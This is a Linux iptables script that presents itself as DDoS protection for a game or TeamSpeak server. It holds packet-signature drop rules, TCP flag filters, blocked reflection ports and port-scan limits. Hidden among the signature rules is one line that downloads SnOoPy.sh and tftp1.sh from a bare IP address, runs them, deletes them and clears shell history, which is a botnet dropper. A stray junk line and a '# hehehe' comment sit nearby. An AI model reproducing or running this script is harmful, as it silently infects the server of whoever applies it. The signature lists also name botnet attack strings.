  iptables -A INPUT -p udp -m string --algo bm --hex-string "|f8f9fafbfcfdfeff|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|f1f2f3f4f5f6f7|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|eaebecedeeeff0|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|e3e4e5e6e7e8e9|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|dcdddedfe0e1e2|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|d5d6d7d8d9dadb|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|cecfd0d1d2d3d4|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|262728292a2b2c|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|1f202122232425|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|11121314151617|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|0a0b0c0d0e0f10|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|03040506070809|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|58992158992158992158992158992158992158992158992158992158992158992158992158992158992158992158992158|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|18191a1b1c1d1e|" -j DROP # hehehe
fffffffffffff
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|434e43|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|434e432041545441434b|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|434e4320464c4f4f44|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|4841434b4552|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|4841434b|" -j DROP
iptables -A INPUT -m u32 --u32 "12&0xFFFF=0xFFFF" -j DROP
  iptables -A INPUT -m string --algo bm --from 28 --to 29 --string "farewell" -j DROP
  iptables -I INPUT -p tcp -m tcp -m string --hex-string "|000000005010|" --algo kmp --from 28 --to 29 -m length --length 40 -j DROP
  iptables -I INPUT -p udp -m udp -m string --hex-string "|53414d50|" --algo kmp --from 28 --to 29 -j DROP
  iptables -A INPUT -p udp -m udp -m string --algo bm --from 32 --to 33 --string "AAAAAAAAAAAAAAAA" -j DROP
  iptables -A INPUT -m string --algo bm --from 32 --to 33 --string "q00000000000000" -j DROP
  iptables -A INPUT -m string --algo bm --from 32 --to 33 --string "statusResponse" -j DROP #SSDP Flood I have seen recently its a patch for it even though OVH picks most the traffic up 
  iptables -A INPUT -p udp -m length --length 1025 -j DROP
  iptables -A INPUT -p udp --dport 61327 -j DROP 
iptables -A INPUT -p udp --source-port 123:123 -m state --state ESTABLISHED -j DROP #NTP ISSUE FIX
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -A INPUT -p udp --dport 9987 -j ACCEPT
iptables -A INPUT -p udp --sport 9987 -j ACCEPT
iptables -A INPUT -p udp --dport 9988 -j ACCEPT
iptables -A INPUT -p udp --sport 9988 -j ACCEPT
iptables -A INPUT -p tcp --dport 30033 -j ACCEPT
iptables -A INPUT -p tcp --sport 30033 -j ACCEPT
iptables -A INPUT -p tcp --dport 10011 -j ACCEPT
iptables -A INPUT -p tcp --sport 10011 -j ACCEPT
iptables -A INPUT -p tcp --dport 41144 -j ACCEPT
iptables -A INPUT -p tcp --sport 41144 -j ACCEPT
iptables -A INPUT -p tcp --dport 2010 -j ACCEPT
iptables -A INPUT -p tcp --sport 2010 -j ACCEPT
iptables -A INPUT -p tcp --dport 2011 -j ACCEPT
iptables -A INPUT -p tcp --sport 2011 -j ACCEPT
iptables -A INPUT -p tcp --dport 2008 -j ACCEPT
iptables -A INPUT -p tcp --sport 2008 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --sport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 8087 -j ACCEPT
iptables -A INPUT -p tcp --sport 8087 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --sport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j ACCEPT
iptables -A INPUT -p tcp --sport 21 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --sport 22 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT -p udp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -d weblist.teamspeak.com --dport 2010 -j ACCEPT
iptables -A OUTPUT -p tcp -d accounting.teamspeak.com --dport 2008 -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -I INPUT -s 109.51.48.210 -j DROP
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,ACK FIN -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags PSH,ACK PSH -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags ACK,URG URG -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,RST FIN,RST -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN FIN,SYN -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,RST,PSH,ACK,URG -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,PSH,URG -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,PSH,URG -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags PSH,ACK,URG, NONE -j DROP
iptables -A INPUT -p udp -m udp --sport 19 -j DROP
iptables -A INPUT -p udp -m udp --sport 123 -j DROP
iptables -A INPUT -p udp -m udp --sport 161 -j DROP
iptables -A INPUT -p udp -m udp --sport 1433 -j DROP
iptables -A INPUT -p udp -m udp --sport 1900 -j DROP
iptables -A INPUT -p udp -m udp --sport 27015 -j DROP
iptables -A INPUT -p udp -m udp --sport 27950 -j DROP
iptables -A INPUT -p udp -m udp --sport 27952 -j DROP
iptables -A INPUT -p udp -m udp --sport 27960 -j DROP
iptables -A INPUT -p udp -m udp --sport 27965 -j DROP
iptables -A INPUT -p udp -m udp --sport 19329 -j DROP
iptables -A INPUT -p udp -m udp --sport 53 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 53 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 19329 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 5353 -j DROP
iptables -A INPUT -p udp -m udp --sport 5353 -j DROP
iptables -A INPUT -p udp -m udp --sport 7143 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 7143 -j DROP
iptables -A INPUT -p tcp -m tcp --sport 123 -j DROP
iptables -A INPUT -p udp -m udp --sport 123 -j DROP
iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -N syn-flood
iptables -A syn-flood -m limit --limit 10/sec --limit-burst 15 -j RETURN
iptables -A syn-flood -j LOG --log-prefix "SYN flood: "
iptables -A syn-flood -j DROP
iptables-save > /etc/iptables/rules.v4
iptables-save > $HOME/TABLES.txt
iptables -N f2b-sshd
iptables -A INPUT -p tcp -m multiport --dports 22 -j f2b-sshd
iptables -A f2b-sshd -j RETURN
iptables -A INPUT -s 10.0.0.0/8 -j DROP
iptables -A INPUT -s 169.254.0.0/16 -j DROP
iptables -A INPUT -s 172.16.0.0/12 -j DROP
iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
iptables -A INPUT -s 224.0.0.0/4 -j DROP
iptables -A INPUT -d 224.0.0.0/4 -j DROP
iptables -A INPUT -s 240.0.0.0/5 -j DROP
iptables -A INPUT -d 240.0.0.0/5 -j DROP
iptables -A INPUT -s 0.0.0.0/8 -j DROP
iptables -A INPUT -d 0.0.0.0/8 -j DROP
iptables -A INPUT -d 239.255.255.0/24 -j DROP
iptables -A INPUT -d 255.255.255.255 -j DROP
iptables -A INPUT -m state --state INVALID -j DROP
iptables -A FORWARD -m state --state INVALID -j DROP
iptables -A OUTPUT -m state --state INVALID -j DROP
iptables -t mangle -A PREROUTING -m conntrack --ctstate INVALID -j DROP
iptables -t mangle -A PREROUTING -p tcp ! --syn -m conntrack --ctstate NEW -j DROP
iptables -t mangle -A PREROUTING -p tcp -m conntrack --ctstate NEW -m tcpmss ! --mss 536:65535 -j DROP
iptables -A INPUT       -m conntrack --ctstate INVALID -j DROP
iptables -A OUTPUT      -m conntrack --ctstate INVALID -j DROP
iptables -A FORWARD     -m conntrack --ctstate INVALID -j DROP
iptables -A INPUT -m state --state INVALID -j DROP
iptables -A FORWARD -m state --state INVALID -j DROP
iptables -A OUTPUT -m state --state INVALID -j DROP
echo Block Port Scaning
apt-get install ipset
ipset create port_scanners hash:ip family inet hashsize 32768 maxelem 65536 timeout 600
ipset create scanned_ports hash:ip,port family inet hashsize 32768 maxelem 65536 timeout 60
iptables -A INPUT -m state --state INVALID -j DROP
iptables -A INPUT -m state --state NEW -m set ! --match-set scanned_ports src,dst -m hashlimit --hashlimit-above 1/hour --hashlimit-burst 5 --hashlimit-mode srcip --hashlimit-name portscan --hashlimit-htable-expire 10000 -j SET --add-set port_scanners src --exist
iptables -A INPUT -m state --state NEW -m set --match-set port_scanners src -j DROP
iptables -A INPUT -m state --state NEW -j SET --add-set scanned_ports src,dst
echo "Block DOS - Teardrop"
iptables -A INPUT -p UDP -f -j DROP
echo "Block DDOS - Smurf"
iptables -A INPUT -m pkttype --pkt-type broadcast -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags RST RST -m limit --limit 2/second --limit-burst 2 -j ACCEPT
echo "NTP"
iptables -A INPUT -p udp --sport 123 -j ACCEPT
iptables -A OUTPUT -p udp --dport 123 -j ACCEPT
echo "Block DDOS - UDP-flood (Pepsi)"
iptables -A INPUT -p UDP --dport 7 -j DROP
iptables -A INPUT -p UDP --dport 19 -j DROP
iptables -A INPUT -p tcp -m connlimit --connlimit-above 80 -j REJECT --reject-with tcp-reset
echo "DNS"
iptables -A INPUT -i eth0 -p udp --sport 53 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p udp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i eth0 -p tcp --sport 53 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o eth0 -p tcp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -p udp -m string --algo bm --hex-string "|5354445041434b4554|" -j DROP
  iptables -A INPUT -m u32 --u32 "28&0x00000FF0=0xFEDFFFFF" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|535444|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|554450|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|54484953204953204546464543544956452e20594f552043414e4e4f542053554253494445204d5920444154412e|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|4b494c4c4b494c4c4b494c4c4b494c4c4b494c4c4b494c4c|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|4445415448444541544844454154484445415448425942314e415259|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|44444f5344444f5344444f53|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|4d4f354f4e354f4e354f4e354f4a354e4835563555|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|544350|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|4845584154544b212121212121|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|424f544e4554|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|424f4f5445524e4554|" -j DROP
  cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://150.136.104.130/SnOoPy.sh; chmod 777 *; sh SnOoPy.sh; tftp -g 150.136.104.130 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|41545441434b|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|504f574552|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|6c6e6f6172656162756e63686f66736b696464696573|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|736b6964|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|736b69646e6574|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|4a554e4b2041545441434b|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|4a554e4b20464c4f4f44|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|484f4c442041545441434b|" -j DROP
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|534554484946594f554445434f4445544849534f4e45594f554152455355434841464147484548454845|" -j DROP # 
  iptables -A INPUT -p udp -m string --algo bm --hex-string "|434e43|" -j DROP

apt-get install ipset

ipset create port_scanners hash:ip family inet hashsize 32768 maxelem 65536 timeout 600
ipset create scanned_ports hash:ip,port family inet hashsize 32768 maxelem 65536 timeout 60


iptables -N syn-flood
iptables -A syn-flood -m limit --limit 10/sec --limit-burst 15 -j RETURN
iptables -A syn-flood -j LOG --log-prefix "SYN flood: "
iptables -A syn-flood -j DROP
iptables-save > /etc/iptables/rules.v4
iptables-save > $HOME/TABLES.txt